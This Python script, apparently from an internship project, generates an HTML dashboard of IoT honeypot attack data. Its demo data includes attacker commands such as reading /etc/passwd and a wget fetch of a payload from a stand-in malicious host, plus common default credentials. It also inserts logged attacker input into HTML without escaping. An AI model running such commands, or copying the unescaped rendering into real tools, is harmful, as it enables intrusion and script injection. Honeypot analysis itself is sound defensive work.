"""
IoT Honeypot - Threat Analysis Dashboard Generator
Creates visual charts from parsed honeypot data
Project 2: Healthcare - IoT Deception Honeypot Network
Infotact Technical Internship Program
"""

import json
import os
from collections import Counter
from datetime import datetime


def load_data():
    """Load IoC and geo data from report files."""
    iocs, geo = {}, []

    if os.path.exists("reports/iocs_extracted.json"):
        with open("reports/iocs_extracted.json") as f:
            iocs = json.load(f)
    else:
        print("[INFO] No IoC data found. Generating with demo data.")
        iocs = {
            "attacker_ips": ["185.220.101.45", "45.33.32.156", "103.21.244.0",
                             "194.165.16.29", "89.248.167.131"],
            "credentials_tried": [
                {"ip": "185.220.101.45", "username": "root", "password": "admin", "success": False},
                {"ip": "185.220.101.45", "username": "root", "password": "123456", "success": False},
                {"ip": "45.33.32.156",   "username": "pi",   "password": "raspberry", "success": True},
                {"ip": "103.21.244.0",   "username": "admin","password": "password", "success": False},
                {"ip": "194.165.16.29",  "username": "root", "password": "root",    "success": True},
                {"ip": "89.248.167.131", "username": "user", "password": "1234",    "success": False},
                {"ip": "185.220.101.45", "username": "root", "password": "toor",    "success": False},
                {"ip": "45.33.32.156",   "username": "admin","password": "admin",   "success": False},
            ],
            "commands_run": [
                {"ip": "45.33.32.156",  "command": "uname -a"},
                {"ip": "45.33.32.156",  "command": "cat /etc/passwd"},
                {"ip": "45.33.32.156",  "command": "wget http://malicious.example/payload.sh"},
                {"ip": "194.165.16.29", "command": "id"},
                {"ip": "194.165.16.29", "command": "ls /opt"},
                {"ip": "194.165.16.29", "command": "cat /opt/vitals-monitor/config.ini"},
            ],
            "files_downloaded": [
                {"ip": "45.33.32.156", "url": "http://malicious.example/payload.sh",
                 "sha256": "a3f1b2c3d4e5f6789012345678901234", "size": 1024}
            ],
            "total_events": 42,
            "session_ids": ["abc123", "def456", "ghi789"]
        }

    if os.path.exists("reports/geo_enriched.json"):
        with open("reports/geo_enriched.json") as f:
            geo = json.load(f)
    else:
        geo = [
            {"ip": "185.220.101.45", "country": "Russia",      "city": "Moscow"},
            {"ip": "45.33.32.156",   "country": "USA",         "city": "Dallas"},
            {"ip": "103.21.244.0",   "country": "China",       "city": "Shanghai"},
            {"ip": "194.165.16.29",  "country": "Netherlands", "city": "Amsterdam"},
            {"ip": "89.248.167.131", "country": "Netherlands", "city": "Amsterdam"},
        ]

    return iocs, geo


def generate_html_dashboard(iocs, geo):
    """Generate a full HTML dashboard with all charts and tables."""
    os.makedirs("reports", exist_ok=True)

    # Prepare data
    country_counts = Counter([g["country"] for g in geo])
    password_counts = Counter([c["password"] for c in iocs.get("credentials_tried", [])])
    username_counts = Counter([c["username"] for c in iocs.get("credentials_tried", [])])
    commands = iocs.get("commands_run", [])
    files = iocs.get("files_downloaded", [])
    total_logins = len(iocs.get("credentials_tried", []))
    successful = sum(1 for c in iocs.get("credentials_tried", []) if c.get("success"))

    # Build country rows
    country_rows = ""
    for country, count in country_counts.most_common(10):
        pct = round(count / max(len(geo), 1) * 100)
        country_rows += f"""
        <tr>
          <td>{country}</td>
          <td>{count}</td>
          <td><div style="background:#E24B4A;height:14px;width:{pct*3}px;border-radius:3px"></div></td>
        </tr>"""

    # Build password rows
    pwd_rows = ""
    for pwd, count in password_counts.most_common(8):
        pwd_rows += f"<tr><td><code>{pwd}</code></td><td>{count}</td></tr>"

    # Build command rows
    cmd_rows = ""
    for c in commands[:10]:
        cmd_rows += f"<tr><td>{c['ip']}</td><td><code>{c['command']}</code></td></tr>"

    # Build file rows
    file_rows = ""
    for f in files:
        file_rows += f"<tr><td>{f['ip']}</td><td style='word-break:break-all;font-size:11px'>{f['sha256']}</td></tr>"
    if not file_rows:
        file_rows = "<tr><td colspan='2' style='color:#888'>No files dropped yet</td></tr>"

    # Build attacker IP rows
    ip_rows = ""
    geo_map = {g["ip"]: g for g in geo}
    for ip in iocs.get("attacker_ips", []):
        g = geo_map.get(ip, {})
        ip_rows += f"<tr><td>{ip}</td><td>{g.get('country','?')}</td><td>{g.get('city','?')}</td><td>{g.get('isp','?')}</td></tr>"

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>IoT Honeypot - Threat Analysis Dashboard</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; }}
  .header {{ background: #161b22; border-bottom: 1px solid #30363d; padding: 20px 30px; }}
  .header h1 {{ font-size: 20px; color: #58a6ff; }}
  .header p {{ font-size: 12px; color: #8b949e; margin-top: 4px; }}
  .container {{ max-width: 1200px; margin: 0 auto; padding: 24px; }}
  .metrics {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; margin-bottom: 24px; }}
  .metric {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; text-align: center; }}
  .metric .num {{ font-size: 32px; font-weight: bold; color: #58a6ff; }}
  .metric .label {{ font-size: 11px; color: #8b949e; margin-top: 4px; }}
  .metric.danger .num {{ color: #f85149; }}
  .metric.warn .num {{ color: #d29922; }}
  .metric.success .num {{ color: #3fb950; }}
  .grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }}
  .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; }}
  .card h3 {{ font-size: 13px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 16px; border-bottom: 1px solid #30363d; padding-bottom: 8px; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 12px; }}
  th {{ text-align: left; color: #8b949e; font-size: 11px; padding: 6px 0; border-bottom: 1px solid #30363d; }}
  td {{ padding: 7px 0; border-bottom: 1px solid #21262d; color: #c9d1d9; }}
  code {{ background: #0d1117; padding: 2px 6px; border-radius: 4px; color: #79c0ff; font-size: 11px; }}
  .badge-red {{ background: #3d1c1c; color: #f85149; padding: 2px 8px; border-radius: 4px; font-size: 10px; }}
  .badge-grn {{ background: #1c3d22; color: #3fb950; padding: 2px 8px; border-radius: 4px; font-size: 10px; }}
  .footer {{ text-align: center; padding: 20px; font-size: 11px; color: #8b949e; }}
  @media(max-width:700px){{ .grid{{ grid-template-columns:1fr; }} }}
</style>
</head>
<body>

<div class="header">
  <h1>IoT Deception Honeypot — Threat Analysis Dashboard</h1>
  <p>Device: VitalsMonitor-RPi4 | Healthcare IoT Honeypot | Infotact Internship Program</p>
  <p style="margin-top:4px">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
</div>

<div class="container">

  <!-- Metric Cards -->
  <div class="metrics">
    <div class="metric danger">
      <div class="num">{len(iocs.get('attacker_ips', []))}</div>
      <div class="label">Unique Attacker IPs</div>
    </div>
    <div class="metric warn">
      <div class="num">{total_logins}</div>
      <div class="label">Login Attempts</div>
    </div>
    <div class="metric danger">
      <div class="num">{successful}</div>
      <div class="label">Successful Logins</div>
    </div>
    <div class="metric">
      <div class="num">{len(commands)}</div>
      <div class="label">Commands Executed</div>
    </div>
    <div class="metric danger">
      <div class="num">{len(files)}</div>
      <div class="label">Malware Files Dropped</div>
    </div>
    <div class="metric">
      <div class="num">{iocs.get('total_events', 0)}</div>
      <div class="label">Total Events Logged</div>
    </div>
  </div>

  <!-- Row 1 -->
  <div class="grid">
    <div class="card">
      <h3>Attack Origins by Country</h3>
      <table>
        <tr><th>Country</th><th>Attacks</th><th>Bar</th></tr>
        {country_rows}
      </table>
    </div>
    <div class="card">
      <h3>Attacker IP Details</h3>
      <table>
        <tr><th>IP Address</th><th>Country</th><th>City</th><th>ISP</th></tr>
        {ip_rows if ip_rows else "<tr><td colspan='4' style='color:#888'>No IPs yet</td></tr>"}
      </table>
    </div>
  </div>

  <!-- Row 2 -->
  <div class="grid">
    <div class="card">
      <h3>Top Passwords Attempted</h3>
      <table>
        <tr><th>Password</th><th>Count</th></tr>
        {pwd_rows if pwd_rows else "<tr><td colspan='2' style='color:#888'>No data yet</td></tr>"}
      </table>
    </div>
    <div class="card">
      <h3>Top Usernames Attempted</h3>
      <table>
        <tr><th>Username</th><th>Count</th></tr>
        {"".join(f"<tr><td><code>{u}</code></td><td>{c}</td></tr>" for u,c in username_counts.most_common(8))
          if username_counts else "<tr><td colspan='2' style='color:#888'>No data yet</td></tr>"}
      </table>
    </div>
  </div>

  <!-- Row 3 -->
  <div class="grid">
    <div class="card">
      <h3>Commands Run by Attackers</h3>
      <table>
        <tr><th>Attacker IP</th><th>Command</th></tr>
        {cmd_rows if cmd_rows else "<tr><td colspan='2' style='color:#888'>No commands yet</td></tr>"}
      </table>
    </div>
    <div class="card">
      <h3>Malware / Files Dropped</h3>
      <table>
        <tr><th>IP</th><th>SHA256 Hash</th></tr>
        {file_rows}
      </table>
    </div>
  </div>

</div>

<div class="footer">
  IoT Deception Honeypot — Healthcare Cyber Defence | Infotact Technical Internship Program<br>
  HIPAA Compliance Evidence — Network Threat Intelligence Report
</div>

</body>
</html>"""

    output = "reports/dashboard.html"
    with open(output, "w") as f:
        f.write(html)

    print(f"[*] Dashboard saved to: {output}")
    print(f"[*] Open it in your browser to view the full threat dashboard!")
    return output


if __name__ == "__main__":
    print("[*] Generating Threat Analysis Dashboard...")
    iocs, geo = load_data()
    generate_html_dashboard(iocs, geo)
    print("\n[*] Done! Open reports/dashboard.html in your browser.")
